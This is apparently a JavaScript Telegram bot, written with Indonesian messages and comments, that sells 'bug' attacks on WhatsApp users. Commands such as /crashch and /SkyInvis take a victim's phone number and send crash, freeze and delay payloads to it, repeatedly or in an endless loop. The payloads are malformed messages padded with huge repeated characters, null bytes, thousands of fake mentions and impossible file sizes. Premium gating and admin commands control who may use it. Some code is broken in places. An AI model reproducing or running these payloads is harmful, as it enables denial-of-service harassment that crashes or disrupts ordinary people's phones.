      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝘾𝙀𝙆 𝙏𝘼𝙍𝙂𝙀𝙏", url: `https://wa.me/${q.replace(/\D/g, "")}` }
        ]]
      }
    });
});
//Case bug twst
bot.command("crashch", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/crashch 1234567891011@Newsletter 628xxxx`);
    }

    let SockNumber = q.replace(/[^0-9]/g, '');

    let target = SockNumber + "@s.whatsapp.net";

    let ProsesSock = await ctx.reply(`Successfully✅`);

    for (let i = 0; i < 200; i++) {
      await crashNewsletter(target);
      await callNewsletter(target);    
    }

    await ctx.telegram.editMessageText(`
        ctx.chat.id,
        ProsesSock.message_id,
        undefined, 
┏━━━━━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${SockNumber}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
});

///////==== CASE BUG 6 ===\\\\\\\
bot.command("SkyInvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example: /SkyInvis <number>`);
  }

  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/\D/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `<blockquote>
▢ Target: ${q}
▢ Status: Sending bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
</blockquote>`,
    parse_mode: "HTML"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 150 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 150 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((r) => setTimeout(r, stage.delay));
    await ctx.editMessageCaption(
      `
<blockquote>
▢ Target: ${q}
▢ Status: Processing...
${stage.text}
</blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
      }
    );
  }

  if (!isOwner(userId)) setGlobalCooldown();

  console.log(chalk.red(`⛓️ Mulai loop pengiriman ke: ${target}`));

  while (true) {
    try {
      await delay5GB(sock, target, false);
      await VanasixForce(target);
      console.log(chalk.redBright(`✅ Sent to ${target}`));
      await new Promise((r) => setTimeout(r, 1000)); // delay biar gak ke-ban
    } catch (err) {
      console.error("❌ Error saat mengirim:", err.message);
      break; // keluar loop kalau error
    }
  }

  await ctx.editMessageCaption(
    `
\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== COMMAND OWNER ====\\\\\\\\\
bot.command("setjeda", checkOwner, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;


  if (!duration) {
    return ctx.reply(`example /setjeda 60s`);
  }

  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return ctx.reply(
      `/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});
///=== comand add admin ===\\\
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 7718855512"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});
bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukin ID Nya GOBLOK !!\nContohnya Gini Nyet: /addprem 57305916"
    );
  }

  const userId = args[1];

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ Kelaz Bocah Pea ini ${userId} sudah memiliki status premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ Kelaz Bocah Pea ini ${userId} sudah memiliki status premium.`
  );
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789"
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Haha Mampus Lu ${userId} Di delprem etmin🗿.`);
});

//fungsi imglink
const imgLinks = [];

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();



  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❌ Masukin nomor ny, Example : /addsender <nomor_wa>"
    );
  }

  let phoneNumber = args[1].replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Santai Masih Aman!! Gass ajaa cik...");
  }

  let sentMessage;

  try {
    // LANGKAH 1: Kirim pesan awal
    sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
- Procces Pair...
☇ Number : ${phoneNumber}
</blockquote>`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });

    // LANGKAH 2: Ambil kode pairing
    const code = await sock.requestPairingCode(phoneNumber, "ACKER1234"); // CUSTOM PAIR DISINI MINIM 8 HURUF
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
<blockquote>
- Your Code Pair Bro. 
☇ Number : ${phoneNumber}
☇ Code  : ${formattedCode}
</blockquote>`,
      { parse_mode: "HTML" }
    );

    // LANGKAH 3: Tunggu koneksi WhatsApp
    let isConnected = true;

sock.ev.on("connection.update", async (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === "open" && !isConnected) {
    isConnected = true;
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
<blockquote>
- Updates Pair
☇ Number : ${phoneNumber}
☇ Status : Successfully
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (connection === "close" && !isConnected) {
    const shouldReconnect =
      lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

    if (!shouldReconnect) {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        sentMessage.message_id,
        null,
        `
<blockuote>
- Updates Pair
☇ Nomor : ${phoneNumber}
☇ Status : Gagal tersambung
\`\`\``,
        { parse_mode: "HTML" }
      );
    }
  }
});


  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});

// Handler tombol close
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", checkOwner, async (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("♻️Session berhasil dihapus, Segera lakukan restart pada panel anda sebelum pairing kembali");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});

//Command Restart
bot.command("restart", checkOwner, async (ctx) => {
  await ctx.reply("Restarting...");
  setTimeout(() => {
    process.exit(0);
  }, 1000); // restart setelah 1 detik
});

/////===== CONST TAMBAHAN =====\\\\\
const mediaData = [
  {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQMuhVOA7B18Sy7AV0yvUWGsQqGjdqfIYg7h-mWqBdTQsyqzUDFNldC7-BtLQY9IsoiaemY3TvEC_I9rb5Xp-O97Z5t30yB1WOU8ac9NxQ?ccb=9-4&oh=01_Q5Aa2AFq5Te3zJlGDOqAVgCJcGi5NJjazkr7NJ7Il1TmbIGpHg&oe=68AA377F&_nc_sid=e6ed6c&mms3=true",
    fileSha256: "5Wd8J7jkKen7rKKcT4JhWMuqXqO8i34y7VCkLoauBwM=",
    fileEncSha256: "N9e6YsXJDFbkLNXdU6XVTcJTlQkaRb5cx+odlt0gefA=",
    mediaKey: "mMf5kFbH6i392LwM6fCj3wgD1Ss3MmdlWtfi8RRRm6g=",
    mimetype: "image/webp",
    directPath: "/o1/v/t24/f2/m234/AQMuhVOA7B18Sy7AV0yvUWGsQqGjdqfIYg7h-mWqBdTQsyqzUDFNldC7-BtLQY9IsoiaemY3TvEC_I9rb5Xp-O97Z5t30yB1WOU8ac9NxQ?ccb=9-4&oh=01_Q5Aa2AFq5Te3zJlGDOqAVgCJcGi5NJjazkr7NJ7Il1TmbIGpHg&oe=68AA377F&_nc_sid=e6ed6c",
    fileLength: 9999999999999,
    mediaKeyTimestamp: 1753395364,
    firstFrameLength: 19904,
    firstFrameSidecar: "KN4kQ5pyABRAgA==",
    isAnimated: true,
  }
];
let sequentialIndex = 0;

/////===== CASE FUNCTION =====\\\\\

async function OtaSpamNotif(target, Ptcp = true) {
console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    await sock.relayMessage(target, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 9999999999999999,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "×‌×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                mediaKeyTimestamp: "1715880173",
                contactVcard: true
              },
              title: "ꦽ".repeat(50000),
              hasMediaAttachment: true
            },
            body: {
              text: "ꦽ".repeat(50000) + "ꦾ".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
            }
          }
        }
      }
    }, { participant: { jid: target } }, { messageId: null });
}

async function FreezePackSticker(target) {
  await sock.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "Xrelly - StickerPack" + "ꦽ".repeat(45000),
      publisher: "",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: [
          "6285215587498@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
        interactiveResponseMessage: {
          body: {
            text: "🦠",
            format: "EXTENSIONS_1"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
            version: 3
            }
          }
        }
      }
    }, {});
  }
  
async function DelayBeta(sock, target) {
  const selectedMedia = mediaData[sequentialIndex];
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let contextInfo = {
    participant: target,
    mentionedJid: [
      "0@s.whatsapp.net",
      ...Array.from(
        { length: 1999 },
        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      ),
    ],
  };

  let otaxMessage = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: contextInfo,
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  let otaxxMessage = {
    extendedTextMessage: {
      text: "ꦾ".repeat(300000),
      contextInfo: contextInfo,
    },
  };

  const janda1 = generateWAMessageFromContent(target, otaxMessage, {});
  const janda2 = generateWAMessageFromContent(target, otaxxMessage, {});
  const janda3 = generateWAMessageFromContent(target, contextInfo, {});
  await otax.relayMessage("status@broadcast", janda1.message, {
    messageId: janda1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  await sock.relayMessage("status@broadcast", janda2.message, {
    messageId: janda2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  await sock.relayMessage("status@broadcast", janda3.message, {
    messageId: janda3.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function VampSpamFc(target) {
  Dragon.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title:
            "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️" +
            "ꦾ".repeat(9000) +
            "@5".repeat(9000),
          hasMediaAttachment: false,
        },
        body: {
          text: "ꦾ".repeat(9000),
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "call_permission_request",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "form_message",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "catalog_message",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "send_location",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "view_product",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "payment_status",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
            {
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                status: true,
              }),
            },
          ],
        },
      },
    },
    { participant: { jid: target } }
  );
}

async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "VALORES ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Seren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Seren.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function InVisibleX1(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙕𐎟𑆻",
                    footerText: "𝘼𝙍𝙂𝘼 𝙊𝙁𝙁 ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await kipip.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await kipip.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎𐎟𑆻⃔‌",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
async function PayMsgFlowX(target) {
console.log(chalk.red(`🚀 Send Forclose ${target}`));
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "© 𝐈𝐬͠𝐚͜𝐠𝐢 ⍣᳟ 𝐈𝐧͠𝐯𝐢͜𝐜𝐭͠𝐮𝐬᭟",
              hasMediaAttachment: false,
            },
            body: {
              text: "© 𝐈𝐬͠𝐚͜𝐠𝐢 ⍣᳟ 𝐈𝐧͠𝐯𝐢͜𝐜𝐭͠𝐮𝐬᭟",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function isagivisble1(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "𝐋𝐚𝐥𝐳𝐳 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "🐉 𝐈𝐬𝐚𝐠𝐢 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🐉" },
                        content: undefined
                    }
                ]
            }
        );
    }
}        

async function FcBetaOtax(target) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "꒐ꂵ ꒯ꏂꋬ꓄ꁝ ꀘ꒐꒒꒒ ꌦꄲ꒤?!",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
          messageParamsJson: "{[".repeat(10000),
            buttons: [
              {
                name: "single_select",
